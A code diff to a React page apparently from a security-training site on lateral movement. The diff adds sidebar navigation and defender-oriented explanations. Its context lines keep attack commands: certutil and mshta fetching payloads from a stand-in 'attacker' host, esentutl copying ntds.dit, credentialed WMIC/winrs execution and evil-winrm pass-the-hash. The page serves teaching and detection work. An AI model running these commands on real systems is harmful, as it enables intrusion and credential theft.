@@ -1,11 +1,9 @@
-import React, { useState } from "react";
+import React, { useState, useEffect } from "react";
 import {
   Box,
   Container,
   Typography,
   Paper,
-  Tabs,
-  Tab,
   Chip,
   Button,
   Accordion,
@@ -27,6 +25,11 @@ import {
   Tooltip,
   Divider,
   alpha,
+  useTheme,
+  useMediaQuery,
+  Drawer,
+  Fab,
+  LinearProgress,
 } from "@mui/material";
 import ArrowBackIcon from "@mui/icons-material/ArrowBack";
 import ExpandMoreIcon from "@mui/icons-material/ExpandMore";
@@ -46,9 +49,26 @@ import KeyboardArrowRightIcon from "@mui/icons-material/KeyboardArrowRight";
 import ShieldIcon from "@mui/icons-material/Shield";
 import SearchIcon from "@mui/icons-material/Search";
 import QuizIcon from "@mui/icons-material/Quiz";
+import ListAltIcon from "@mui/icons-material/ListAlt";
+import CloseIcon from "@mui/icons-material/Close";
+import KeyboardArrowUpIcon from "@mui/icons-material/KeyboardArrowUp";
 import { Link, useNavigate } from "react-router-dom";
 import LearnPageLayout from "../components/LearnPageLayout";
 import QuizSection, { QuizQuestion } from "../components/QuizSection";
+
+// Section Navigation Items
+const sectionNavItems = [
+  { id: "intro", label: "Introduction", icon: <AccountTreeIcon /> },
+  { id: "fundamentals", label: "Fundamentals", icon: <SecurityIcon /> },
+  { id: "windows-protocols", label: "Windows Protocols", icon: <ComputerIcon /> },
+  { id: "lotl", label: "Living off the Land", icon: <TerminalIcon /> },
+  { id: "credential-attacks", label: "Credential Attacks", icon: <VpnKeyIcon /> },
+  { id: "linux-ssh", label: "Linux/SSH", icon: <StorageIcon /> },
+  { id: "cloud-pivoting", label: "Cloud Pivoting", icon: <CloudIcon /> },
+  { id: "evasion", label: "Evasion", icon: <BugReportIcon /> },
+  { id: "tools", label: "Tools", icon: <BuildIcon /> },
+  { id: "quiz-section", label: "Knowledge Check", icon: <QuizIcon /> },
+];
 
 // Theme colors
 const theme = {
@@ -1049,21 +1069,6 @@ const quizQuestions: QuizQuestion[] = [
   },
 ];
 
-interface TabPanelProps {
-  children?: React.ReactNode;
-  index: number;
-  value: number;
-}
-
-function TabPanel(props: TabPanelProps) {
-  const { children, value, index, ...other } = props;
-  return (
-    <div role="tabpanel" hidden={value !== index} {...other}>
-      {value === index && <Box sx={{ py: 3 }}>{children}</Box>}
-    </div>
-  );
-}
-
 // Enhanced CodeBlock
 const CodeBlock: React.FC<{ code: string; language?: string; title?: string }> = ({ code, language = "powershell", title }) => {
   const [copied, setCopied] = useState(false);
@@ -1147,8 +1152,106 @@ const accordionSummarySx = (color: string = theme.primary) => ({
 });
 
 const LateralMovementPage: React.FC = () => {
+  const muiTheme = useTheme();
   const navigate = useNavigate();
-  const [tabValue, setTabValue] = useState(0);
+  const isMobile = useMediaQuery(muiTheme.breakpoints.down("md"));
+  const [navDrawerOpen, setNavDrawerOpen] = useState(false);
+  const [activeSection, setActiveSection] = useState("intro");
+
+  const scrollToSection = (id: string) => {
+    const el = document.getElementById(id);
+    if (el) {
+      el.scrollIntoView({ behavior: "smooth", block: "start" });
+      setActiveSection(id);
+      setNavDrawerOpen(false);
+    }
+  };
+
+  useEffect(() => {
+    const handleScroll = () => {
+      const sections = sectionNavItems.map((s) => s.id);
+      for (const id of sections) {
+        const el = document.getElementById(id);
+        if (el) {
+          const rect = el.getBoundingClientRect();
+          if (rect.top <= 150 && rect.bottom > 150) {
+            setActiveSection(id);
+            break;
+          }
+        }
+      }
+    };
+    window.addEventListener("scroll", handleScroll, { passive: true });
+    return () => window.removeEventListener("scroll", handleScroll);
+  }, []);
+
+  // Sidebar navigation component
+  const sidebarNav = (
+    <Paper
+      sx={{
+        p: 2,
+        position: "sticky",
+        top: 80,
+        maxHeight: "calc(100vh - 100px)",
+        overflowY: "auto",
+        bgcolor: theme.bgCard,
+        border: `1px solid ${alpha(theme.primary, 0.2)}`,
+        borderRadius: 2,
+      }}
+    >
+      <Typography variant="subtitle2" sx={{ fontWeight: 700, color: theme.primary, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
+        <ListAltIcon fontSize="small" />
+        Contents
+      </Typography>
+      <Box sx={{ mb: 2 }}>
+        <LinearProgress
+          variant="determinate"
+          value={((sectionNavItems.findIndex((s) => s.id === activeSection) + 1) / sectionNavItems.length) * 100}
+          sx={{
+            height: 4,
+            borderRadius: 2,
+            bgcolor: alpha(theme.primary, 0.1),
+            "& .MuiLinearProgress-bar": { bgcolor: theme.primary },
+          }}
+        />
+        <Typography variant="caption" sx={{ color: theme.textMuted, mt: 0.5, display: "block" }}>
+          {sectionNavItems.findIndex((s) => s.id === activeSection) + 1} / {sectionNavItems.length} sections
+        </Typography>
+      </Box>
+      <List dense disablePadding>
+        {sectionNavItems.map((item) => (
+          <ListItem
+            key={item.id}
+            component="button"
+            onClick={() => scrollToSection(item.id)}
+            sx={{
+              borderRadius: 1,
+              mb: 0.5,
+              bgcolor: activeSection === item.id ? alpha(theme.primary, 0.15) : "transparent",
+              borderLeft: activeSection === item.id ? `3px solid ${theme.primary}` : "3px solid transparent",
+              cursor: "pointer",
+              border: "none",
+              width: "100%",
+              textAlign: "left",
+              "&:hover": { bgcolor: alpha(theme.primary, 0.08) },
+            }}
+          >
+            <ListItemIcon sx={{ minWidth: 32, color: activeSection === item.id ? theme.primary : theme.textMuted }}>
+              {item.icon}
+            </ListItemIcon>
+            <ListItemText
+              primary={item.label}
+              primaryTypographyProps={{
+                variant: "body2",
+                fontWeight: activeSection === item.id ? 600 : 400,
+                color: activeSection === item.id ? "#e0e0e0" : theme.textMuted,
+              }}
+            />
+          </ListItem>
+        ))}
+      </List>
+    </Paper>
+  );
 
   const pageContext = `This page covers Lateral Movement techniques for penetration testing including Windows remote protocols (PsExec, WMI, WinRM, DCOM, RDP), Living off the Land (LOLBins), credential attacks (Pass-the-Hash, Pass-the-Ticket, Kerberoasting), Linux/SSH pivoting, cloud pivoting, container escape, and OPSEC best practices. It also includes telemetry artifacts, detection signals, and defensive checklists for blue teams.`;
   const movementObjectives = [
@@ -1224,9 +1327,19 @@ const LateralMovementPage: React.FC = () => {
   return (
     <LearnPageLayout pageTitle="Lateral Movement Techniques" pageContext={pageContext}>
     <Box sx={{ minHeight: "100vh", bgcolor: theme.bgDark, py: 4 }}>
-      <Container maxWidth="lg">
+      <Container maxWidth="xl">
+        <Grid container spacing={3}>
+          {/* Sidebar Navigation - Desktop */}
+          {!isMobile && (
+            <Grid item md={2.5} sx={{ display: { xs: "none", md: "block" } }}>
+              {sidebarNav}
+            </Grid>
+          )}
+
+          {/* Main Content */}
+          <Grid item xs={12} md={9.5}>
         {/* Header */}
-        <Box sx={{ mb: 5 }}>
+        <Box id="intro" sx={{ mb: 5, scrollMarginTop: 80 }}>
           <Chip
             component={Link}
             to="/learn"
@@ -1298,38 +1411,22 @@ const LateralMovementPage: React.FC = () => {
                   />
                 ))}
               </Box>
+              <Typography variant="body1" sx={{ color: theme.textMuted, mt: 3, lineHeight: 1.8 }}>
+                Lateral movement is about how access expands after an initial foothold. It is the phase where a single
+                compromised endpoint becomes a bridge to other systems, identities, and data stores that were not
+                reachable before.
+              </Typography>
+              <Typography variant="body2" sx={{ color: theme.textMuted, mt: 1, lineHeight: 1.8 }}>
+                This page explains the behaviors defenders need to recognize, the telemetry that shows those behaviors,
+                and the controls that make movement harder. The focus is understanding and defense, not unauthorized use.
+              </Typography>
             </Box>
           </Paper>
         </Box>
 
-        {/* Tabs Container */}
-        <Paper elevation={0} sx={{ bgcolor: theme.bgCard, borderRadius: 3, border: `1px solid ${theme.border}`, overflow: "hidden" }}>
-          <Tabs
-            value={tabValue}
-            onChange={(_, v) => setTabValue(v)}
-            variant="scrollable"
-            scrollButtons="auto"
-            sx={{
-              bgcolor: alpha(theme.primary, 0.05),
-              borderBottom: `1px solid ${theme.border}`,
-              "& .MuiTab-root": { color: theme.textMuted, fontWeight: 500, minHeight: 64, "&:hover": { color: theme.primary, bgcolor: alpha(theme.primary, 0.1) } },
-              "& .Mui-selected": { color: `${theme.primary} !important`, fontWeight: 600 },
-              "& .MuiTabs-indicator": { height: 3, borderRadius: "3px 3px 0 0", background: `linear-gradient(90deg, ${theme.primary}, ${theme.secondary})` },
-            }}
-          >
-            <Tab icon={<SecurityIcon />} label="Fundamentals" />
-            <Tab icon={<ComputerIcon />} label="Windows Protocols" />
-            <Tab icon={<TerminalIcon />} label="Living off the Land" />
-            <Tab icon={<VpnKeyIcon />} label="Credential Attacks" />
-            <Tab icon={<StorageIcon />} label="Linux/SSH" />
-            <Tab icon={<CloudIcon />} label="Cloud Pivoting" />
-            <Tab icon={<BugReportIcon />} label="Evasion" />
-            <Tab icon={<BuildIcon />} label="Tools" />
-          </Tabs>
-
-          {/* Tab 0: Fundamentals */}
-          <TabPanel value={tabValue} index={0}>
-            <Box sx={{ p: 3 }}>
+        {/* Section: Fundamentals */}
+        <Box id="fundamentals" sx={{ mt: 4, scrollMarginTop: 80 }}>
+          <Paper elevation={0} sx={{ bgcolor: theme.bgCard, borderRadius: 3, border: `1px solid ${theme.border}`, overflow: "hidden", p: 3 }}>
               <Box sx={{ mb: 4 }}>
                 <Box sx={{ display: "flex", alignItems: "center", gap: 2, mb: 1 }}>
                   <SecurityIcon sx={{ color: theme.primary }} />
@@ -1353,6 +1450,16 @@ const LateralMovementPage: React.FC = () => {
                   <Typography sx={{ color: theme.textMuted, mb: 3, lineHeight: 1.8 }}>
                     Lateral movement refers to techniques attackers use to progressively move through a network after gaining initial access, searching for sensitive data and high-value targets. It's a critical phase in the cyber kill chain.
                   </Typography>
+                  <Typography sx={{ color: theme.textMuted, mb: 2, lineHeight: 1.8 }}>
+                    Defenders should think of lateral movement as a pattern rather than a single action. It often combines
+                    discovery, credential reuse, remote access, and persistence across many systems, which creates a trail
+                    of small signals rather than one obvious event.
+                  </Typography>
+                  <Typography sx={{ color: theme.textMuted, mb: 3, lineHeight: 1.8 }}>
+                    The goal of detection is to connect those small signals into a narrative: an identity that suddenly
+                    authenticates to new hosts, a workstation that becomes a jump point, or a service account used outside
+                    its normal window.
+                  </Typography>
                   <Grid container spacing={2} sx={{ mb: 3 }}>
                     {[
                       { title: "Discovery", desc: "Enumerate hosts, services, users", color: theme.secondary },
@@ -1371,7 +1478,7 @@ const LateralMovementPage: React.FC = () => {
                 </AccordionDetails>
               </Accordion>
 
-              <Accordion sx={accordionSx(theme.info)}>
+              <Accordion defaultExpanded sx={accordionSx(theme.info)}>
                 <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.info }} />} sx={accordionSummarySx(theme.info)}>
                   <SecurityIcon sx={{ color: theme.info, mr: 1.5 }} />
                   <Typography variant="h6" sx={{ fontWeight: 600, color: theme.text }}>MITRE ATT&CK Mapping</Typography>
@@ -1380,6 +1487,10 @@ const LateralMovementPage: React.FC = () => {
                   <Alert severity="info" sx={{ mb: 3, bgcolor: alpha(theme.info, 0.1), border: `1px solid ${alpha(theme.info, 0.3)}` }}>
                     MITRE ATT&CK Tactic: <strong>TA0008 - Lateral Movement</strong>
                   </Alert>
+                  <Typography sx={{ color: theme.textMuted, mb: 2, lineHeight: 1.8 }}>
+                    ATT&CK mapping provides shared language for detections, incidents, and reporting. Use the tactic and
+                    technique labels to connect alerts to the expected behaviors and to identify gaps in coverage.
+                  </Typography>
                   <TableContainer component={Paper} sx={{ bgcolor: "transparent", borderRadius: 2, border: `1px solid ${alpha(theme.info, 0.2)}` }}>
                     <Table size="small">
                       <TableHead>
@@ -1410,12 +1521,16 @@ const LateralMovementPage: React.FC = () => {
                 </AccordionDetails>
               </Accordion>
 
-              <Accordion sx={accordionSx(theme.success)}>
+              <Accordion defaultExpanded sx={accordionSx(theme.success)}>
                 <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.success }} />} sx={accordionSummarySx(theme.success)}>
                   <CheckCircleIcon sx={{ color: theme.success, mr: 1.5 }} />
                   <Typography variant="h6" sx={{ fontWeight: 600, color: theme.text }}>Prerequisites for Movement</Typography>
                 </AccordionSummary>
                 <AccordionDetails sx={{ pt: 3 }}>
+                  <Typography sx={{ color: theme.textMuted, mb: 3, lineHeight: 1.8 }}>
+                    Lateral movement succeeds when access, identity, and network paths align. By documenting and
+                    hardening these prerequisites, defenders can break the chain before it expands.
+                  </Typography>
                   <Grid container spacing={3}>
                     <Grid item xs={12} md={6}>
                       <Paper sx={{ p: 3, bgcolor: theme.bgNested, border: `1px solid ${alpha(theme.success, 0.3)}`, borderRadius: 3, height: "100%" }}>
@@ -1453,12 +1568,16 @@ const LateralMovementPage: React.FC = () => {
                 </AccordionDetails>
               </Accordion>
 
-              <Accordion sx={accordionSx(theme.warning)}>
+              <Accordion defaultExpanded sx={accordionSx(theme.warning)}>
                 <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.warning }} />} sx={accordionSummarySx(theme.warning)}>
                   <VpnKeyIcon sx={{ color: theme.warning, mr: 1.5 }} />
                   <Typography variant="h6" sx={{ fontWeight: 600, color: theme.text }}>Credential Types</Typography>
                 </AccordionSummary>
                 <AccordionDetails sx={{ pt: 3 }}>
+                  <Typography sx={{ color: theme.textMuted, mb: 2, lineHeight: 1.8 }}>
+                    Different credential types leave different traces. Knowing which forms are in play helps defenders
+                    focus on the right logs and mitigation paths.
+                  </Typography>
                   <TableContainer component={Paper} sx={{ bgcolor: "transparent", borderRadius: 2, border: `1px solid ${alpha(theme.warning, 0.2)}` }}>
                     <Table size="small">
                       <TableHead>
@@ -1487,12 +1606,16 @@ const LateralMovementPage: React.FC = () => {
                 </AccordionDetails>
               </Accordion>
 
-              <Accordion sx={accordionSx(theme.secondary)}>
+              <Accordion defaultExpanded sx={accordionSx(theme.secondary)}>
                 <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.secondary }} />} sx={accordionSummarySx(theme.secondary)}>
                   <SecurityIcon sx={{ color: theme.secondary, mr: 1.5 }} />
                   <Typography variant="h6" sx={{ fontWeight: 600, color: theme.text }}>Discovery Commands</Typography>
                 </AccordionSummary>
                 <AccordionDetails sx={{ pt: 3 }}>
+                  <Typography sx={{ color: theme.textMuted, mb: 2, lineHeight: 1.8 }}>
+                    Discovery activity should be tightly scoped and authorized. In defensive contexts, prefer asset
+                    inventories, CMDB data, and read-only queries rather than broad scanning in production networks.
+                  </Typography>
                   <CodeBlock
                     language="powershell"
                     title="Network & Domain Discovery"
@@ -1515,12 +1638,16 @@ crackmapexec smb TARGETS --shares`}
                 </AccordionDetails>
               </Accordion>
 
-              <Accordion sx={accordionSx(theme.info)}>
+              <Accordion defaultExpanded sx={accordionSx(theme.info)}>
                 <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.info }} />} sx={accordionSummarySx(theme.info)}>
                   <AccountTreeIcon sx={{ color: theme.info, mr: 1.5 }} />
                   <Typography variant="h6" sx={{ fontWeight: 600, color: theme.text }}>Movement Objectives</Typography>
                 </AccordionSummary>
                 <AccordionDetails sx={{ pt: 3 }}>
+                  <Typography sx={{ color: theme.textMuted, mb: 2, lineHeight: 1.8 }}>
+                    Attackers tend to move toward systems that provide higher privilege, broader visibility, or access
+                    to sensitive data. Defenders can use these objectives to prioritize monitoring and segmentation.
+                  </Typography>
                   <List dense>
                     {movementObjectives.map((item) => (
                       <ListItem key={item} sx={{ py: 0.5, px: 0 }}>
@@ -1534,12 +1661,16 @@ crackmapexec smb TARGETS --shares`}
                 </AccordionDetails>
               </Accordion>
 
-              <Accordion sx={accordionSx(theme.warning)}>
+              <Accordion defaultExpanded sx={accordionSx(theme.warning)}>
                 <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.warning }} />} sx={accordionSummarySx(theme.warning)}>
                   <SearchIcon sx={{ color: theme.warning, mr: 1.5 }} />
                   <Typography variant="h6" sx={{ fontWeight: 600, color: theme.text }}>Artifacts and Telemetry</Typography>
                 </AccordionSummary>
                 <AccordionDetails sx={{ pt: 3 }}>
+                  <Typography sx={{ color: theme.textMuted, mb: 2, lineHeight: 1.8 }}>
+                    Lateral movement produces evidence across endpoints, identity systems, and network logs. Correlating
+                    these sources is usually the difference between a weak hunch and a strong conclusion.
+                  </Typography>
                   <TableContainer component={Paper} sx={{ bgcolor: "transparent", borderRadius: 2, border: `1px solid ${alpha(theme.warning, 0.2)}` }}>
                     <Table size="small">
                       <TableHead>
@@ -1561,12 +1692,16 @@ crackmapexec smb TARGETS --shares`}
                 </AccordionDetails>
               </Accordion>
 
-              <Accordion sx={accordionSx(theme.success)}>
+              <Accordion defaultExpanded sx={accordionSx(theme.success)}>
                 <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.success }} />} sx={accordionSummarySx(theme.success)}>
                   <ShieldIcon sx={{ color: theme.success, mr: 1.5 }} />
                   <Typography variant="h6" sx={{ fontWeight: 600, color: theme.text }}>Defensive Checklist</Typography>
                 </AccordionSummary>
                 <AccordionDetails sx={{ pt: 3 }}>
+                  <Typography sx={{ color: theme.textMuted, mb: 2, lineHeight: 1.8 }}>
+                    Defense is a layered approach. The checklist below is most effective when you combine identity
+                    protections, network controls, and continuous monitoring.
+                  </Typography>
                   <List dense>
                     {defensiveChecklist.map((item) => (
                       <ListItem key={item} sx={{ py: 0.5, px: 0 }}>
@@ -1579,12 +1714,12 @@ crackmapexec smb TARGETS --shares`}
                   </List>
                 </AccordionDetails>
               </Accordion>
-            </Box>
-          </TabPanel>
+          </Paper>
+        </Box>
 
-          {/* Tab 1: Windows Protocols */}
-          <TabPanel value={tabValue} index={1}>
-            <Box sx={{ p: 3 }}>
+        {/* Section: Windows Protocols */}
+        <Box id="windows-protocols" sx={{ mt: 4, scrollMarginTop: 80 }}>
+          <Paper elevation={0} sx={{ bgcolor: theme.bgCard, borderRadius: 3, border: `1px solid ${theme.border}`, overflow: "hidden", p: 3 }}>
               <Box sx={{ mb: 4 }}>
                 <Box sx={{ display: "flex", alignItems: "center", gap: 2, mb: 1 }}>
                   <ComputerIcon sx={{ color: theme.primary }} />
@@ -1598,9 +1733,18 @@ crackmapexec smb TARGETS --shares`}
               <Alert severity="info" sx={{ mb: 4, bgcolor: alpha(theme.info, 0.1), border: `1px solid ${alpha(theme.info, 0.3)}` }}>
                 Windows offers multiple remote execution protocols. Each has different requirements, artifacts, and detection profiles.
               </Alert>
+              <Typography sx={{ color: theme.textMuted, mb: 3, lineHeight: 1.8 }}>
+                These protocols are legitimate administration pathways, which makes them attractive during misuse.
+                The goal for defenders is to distinguish approved remote access from anomalous access that does not
+                match expected roles, devices, or timing.
+              </Typography>
 
               <Paper sx={{ p: 3, mb: 3, bgcolor: theme.bgNested, borderRadius: 3, border: `1px solid ${alpha(theme.info, 0.2)}` }}>
                 <Typography variant="h6" sx={{ fontWeight: 600, color: theme.info, mb: 2 }}>Protocol Matrix</Typography>
+                <Typography variant="body2" sx={{ color: theme.textMuted, mb: 2 }}>
+                  Use this matrix to compare how each protocol authenticates, which ports it uses, and where it leaves
+                  telemetry. That comparison helps determine the best detection path for your environment.
+                </Typography>
                 <TableContainer>
                   <Table size="small">
                     <TableHead>
@@ -1627,6 +1771,10 @@ crackmapexec smb TARGETS --shares`}
 
               <Paper sx={{ p: 3, mb: 3, bgcolor: theme.bgNested, borderRadius: 3, border: `1px solid ${alpha(theme.warning, 0.2)}` }}>
                 <Typography variant="h6" sx={{ fontWeight: 600, color: theme.warning, mb: 2 }}>Key Event IDs to Watch</Typography>
+                <Typography variant="body2" sx={{ color: theme.textMuted, mb: 2 }}>
+                  Event IDs help confirm that a remote action took place, but they should be paired with identity and
+                  network logs to confirm whether the access was expected or risky.
+                </Typography>
                 <List dense>
                   {windowsEventIds.map((item) => (
                     <ListItem key={item} sx={{ py: 0.25, px: 0 }}>
@@ -1647,6 +1795,10 @@ crackmapexec smb TARGETS --shares`}
                 <AccordionDetails sx={{ pt: 3 }}>
                   <Typography sx={{ color: theme.textMuted, mb: 2, lineHeight: 1.7 }}>
                     PsExec uses SMB to copy a service binary and execute commands remotely. Port 445 required.
+                  </Typography>
+                  <Typography sx={{ color: theme.textMuted, mb: 2, lineHeight: 1.7 }}>
+                    From a defensive perspective, look for new service creation on the target, file writes to admin
+                    shares, and unusual account usage that does not match the typical admin workflow.
                   </Typography>
                   <CodeBlock
                     language="cmd"
@@ -1682,6 +1834,10 @@ smbexec.py DOMAIN/user:password@TARGET`}
                   <Typography sx={{ color: theme.textMuted, mb: 2 }}>
                     WMI provides remote management using DCOM (port 135 + dynamic). No binary upload required.
                   </Typography>
+                  <Typography sx={{ color: theme.textMuted, mb: 2 }}>
+                    WMI activity often blends into administrative traffic. Watch for remote process creation events,
+                    WMI-specific logs, and authentication spikes from unexpected endpoints.
+                  </Typography>
                   <CodeBlock
                     language="powershell"
                     title="WMI Remote Execution"
@@ -1710,6 +1866,10 @@ crackmapexec wmi TARGET -u user -p password -x "whoami"`}
                 <AccordionDetails sx={{ pt: 3 }}>
                   <Typography sx={{ color: theme.textMuted, mb: 2 }}>
                     WinRM enables PowerShell remoting over HTTP (5985) or HTTPS (5986). Native Windows feature.
+                  </Typography>
+                  <Typography sx={{ color: theme.textMuted, mb: 2 }}>
+                    WinRM is common in enterprise automation, so the detection challenge is to identify new or unusual
+                    remoting patterns, especially when a user account touches many systems quickly.
                   </Typography>
                   <CodeBlock
                     language="powershell"
@@ -1743,6 +1903,10 @@ evil-winrm -i TARGET -u user -H NTLM_HASH`}
                   <Typography sx={{ color: theme.textMuted, mb: 2 }}>
                     DCOM allows remote object instantiation. Lower detection profile than PsExec/WMI.
                   </Typography>
+                  <Typography sx={{ color: theme.textMuted, mb: 2 }}>
+                    Because DCOM can be noisy to interpret, defenders should tie it to authentication logs and process
+                    creation records to confirm intent and scope.
+                  </Typography>
                   <CodeBlock
                     language="powershell"
                     title="DCOM Execution"
@@ -1770,6 +1934,10 @@ dcomexec.py -object MMC20 DOMAIN/user:password@TARGET`}
                   <Typography variant="h6" sx={{ fontWeight: 600, color: theme.text }}>RDP (Remote Desktop)</Typography>
                 </AccordionSummary>
                 <AccordionDetails sx={{ pt: 3 }}>
+                  <Typography sx={{ color: theme.textMuted, mb: 2, lineHeight: 1.7 }}>
+                    RDP provides full interactive access and leaves rich authentication evidence. Focus on unusual
+                    logons, new source hosts, and atypical times for privileged sessions.
+                  </Typography>
                   <CodeBlock
                     language="bash"
                     title="RDP Connections"
@@ -1795,6 +1963,10 @@ reg add "HKLM\\System\\CurrentControlSet\\Control\\Lsa" /v DisableRestrictedAdmi
                   <Typography variant="h6" sx={{ fontWeight: 600, color: theme.text }}>Protocol Comparison</Typography>
                 </AccordionSummary>
                 <AccordionDetails sx={{ pt: 3 }}>
+                  <Typography sx={{ color: theme.textMuted, mb: 2, lineHeight: 1.7 }}>
+                    Use this comparison to align detection coverage and to justify which protocols should be restricted
+                    or monitored more heavily in sensitive zones.
+                  </Typography>
                   <TableContainer component={Paper} sx={{ bgcolor: "transparent", borderRadius: 2, border: `1px solid ${alpha(theme.warning, 0.2)}` }}>
                     <Table size="small">
                       <TableHead>
@@ -1834,12 +2006,12 @@ reg add "HKLM\\System\\CurrentControlSet\\Control\\Lsa" /v DisableRestrictedAdmi
                   </TableContainer>
                 </AccordionDetails>
               </Accordion>
-            </Box>
-          </TabPanel>
+          </Paper>
+        </Box>
 
-          {/* Tab 2: Living off the Land */}
-          <TabPanel value={tabValue} index={2}>
-            <Box sx={{ p: 3 }}>
+        {/* Section: Living off the Land */}
+        <Box id="lotl" sx={{ mt: 4, scrollMarginTop: 80 }}>
+          <Paper elevation={0} sx={{ bgcolor: theme.bgCard, borderRadius: 3, border: `1px solid ${theme.border}`, overflow: "hidden", p: 3 }}>
               <Box sx={{ mb: 4 }}>
                 <Box sx={{ display: "flex", alignItems: "center", gap: 2, mb: 1 }}>
                   <TerminalIcon sx={{ color: theme.primary }} />
@@ -1853,16 +2025,25 @@ reg add "HKLM\\System\\CurrentControlSet\\Control\\Lsa" /v DisableRestrictedAdmi
               <Alert severity="info" sx={{ mb: 4, bgcolor: alpha(theme.info, 0.1), border: `1px solid ${alpha(theme.info, 0.3)}` }}>
                 LOLBins are legitimate system binaries that can be abused for malicious purposes, evading signature-based detection.
               </Alert>
+              <Typography sx={{ color: theme.textMuted, mb: 3, lineHeight: 1.8 }}>
+                Because these binaries are trusted and commonly present, defenders must rely on behavior and context.
+                Focus on unusual parent processes, unexpected command line arguments, and executions that occur outside
+                normal maintenance windows.
+              </Typography>
 
               <Accordion defaultExpanded sx={accordionSx(theme.primary)}>
-                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.primary }} />} sx={accordionSummarySx(theme.primary)}>
-                  <TerminalIcon sx={{ color: theme.primary, mr: 1.5 }} />
-                  <Typography variant="h6" sx={{ fontWeight: 600, color: theme.text }}>Remote Execution LOLBins</Typography>
-                </AccordionSummary>
-                <AccordionDetails sx={{ pt: 3 }}>
-                  <CodeBlock
-                    language="cmd"
-                    title="Remote Command Execution"
+              <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.primary }} />} sx={accordionSummarySx(theme.primary)}>
+                <TerminalIcon sx={{ color: theme.primary, mr: 1.5 }} />
+                <Typography variant="h6" sx={{ fontWeight: 600, color: theme.text }}>Remote Execution LOLBins</Typography>
+              </AccordionSummary>
+              <AccordionDetails sx={{ pt: 3 }}>
+                <Typography sx={{ color: theme.textMuted, mb: 2, lineHeight: 1.8 }}>
+                  These tools exist to help administrators run remote actions. Suspicious usage typically shows up as
+                  command execution across many hosts, unexpected service creation, or accounts used outside their scope.
+                </Typography>
+                <CodeBlock
+                  language="cmd"
+                  title="Remote Command Execution"
                     code={`# WMIC - Remote process creation
 wmic /node:TARGET /user:DOMAIN\\user /password:pass process call create "cmd.exe /c whoami > C:\\output.txt"
 
@@ -1883,14 +2064,18 @@ winrs -r:TARGET -u:DOMAIN\\user -p:password "whoami && hostname"`}
               </Accordion>
 
               <Accordion sx={accordionSx(theme.info)}>
-                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.info }} />} sx={accordionSummarySx(theme.info)}>
-                  <StorageIcon sx={{ color: theme.info, mr: 1.5 }} />
-                  <Typography variant="h6" sx={{ fontWeight: 600, color: theme.text }}>File Transfer LOLBins</Typography>
-                </AccordionSummary>
-                <AccordionDetails sx={{ pt: 3 }}>
-                  <CodeBlock
-                    language="powershell"
-                    title="File Download Methods"
+              <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.info }} />} sx={accordionSummarySx(theme.info)}>
+                <StorageIcon sx={{ color: theme.info, mr: 1.5 }} />
+                <Typography variant="h6" sx={{ fontWeight: 600, color: theme.text }}>File Transfer LOLBins</Typography>
+              </AccordionSummary>
+              <AccordionDetails sx={{ pt: 3 }}>
+                <Typography sx={{ color: theme.textMuted, mb: 2, lineHeight: 1.8 }}>
+                  File transfer binaries are common in IT workflows. What matters is destination, frequency, and
+                  whether files originate from approved repositories or untrusted sources.
+                </Typography>
+                <CodeBlock
+                  language="powershell"
+                  title="File Download Methods"
                     code={`# certutil - Download files
 certutil -urlcache -split -f http://attacker/file.exe C:\\Windows\\Temp\\file.exe
 
@@ -1944,14 +2129,18 @@ esentutl.exe /y C:\\Windows\\ntds\\ntds.dit /d C:\\temp\\ntds.dit /o`}
               </Accordion>
 
               <Accordion sx={accordionSx(theme.accent)}>
-                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.accent }} />} sx={accordionSummarySx(theme.accent)}>
-                  <TerminalIcon sx={{ color: theme.accent, mr: 1.5 }} />
-                  <Typography variant="h6" sx={{ fontWeight: 600, color: theme.text }}>Code Execution LOLBins</Typography>
-                </AccordionSummary>
-                <AccordionDetails sx={{ pt: 3 }}>
-                  <CodeBlock
-                    language="cmd"
-                    title="Local Code Execution"
+              <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.accent }} />} sx={accordionSummarySx(theme.accent)}>
+                <TerminalIcon sx={{ color: theme.accent, mr: 1.5 }} />
+                <Typography variant="h6" sx={{ fontWeight: 600, color: theme.text }}>Code Execution LOLBins</Typography>
+              </AccordionSummary>
+              <AccordionDetails sx={{ pt: 3 }}>
+                <Typography sx={{ color: theme.textMuted, mb: 2, lineHeight: 1.8 }}>
+                  Code execution via built-in binaries often bypasses naive allow lists. Monitoring command line
+                  arguments and parent-child process relationships is critical for detection.
+                </Typography>
+                <CodeBlock
+                  language="cmd"
+                  title="Local Code Execution"
                     code={`# mshta - Execute HTA
 mshta http://attacker/payload.hta
 mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""calc"":close")
@@ -1979,14 +2168,18 @@ pcalua.exe -a calc.exe`}
               </Accordion>
 
               <Accordion sx={accordionSx(theme.warning)}>
-                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.warning }} />} sx={accordionSummarySx(theme.warning)}>
-                  <SecurityIcon sx={{ color: theme.warning, mr: 1.5 }} />
-                  <Typography variant="h6" sx={{ fontWeight: 600, color: theme.text }}>AppLocker/WDAC Bypass</Typography>
-                </AccordionSummary>
-                <AccordionDetails sx={{ pt: 3 }}>
-                  <CodeBlock
-                    language="powershell"
-                    title="Bypass Techniques"
+              <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.warning }} />} sx={accordionSummarySx(theme.warning)}>
+                <SecurityIcon sx={{ color: theme.warning, mr: 1.5 }} />
+                <Typography variant="h6" sx={{ fontWeight: 600, color: theme.text }}>AppLocker/WDAC Bypass</Typography>
+              </AccordionSummary>
+              <AccordionDetails sx={{ pt: 3 }}>
+                <Typography sx={{ color: theme.textMuted, mb: 2, lineHeight: 1.8 }}>
+                  Application control is only effective when rules are tight and exceptions are monitored. Review
+                  execution in trusted locations and validate signed binaries with expected usage patterns.
+                </Typography>
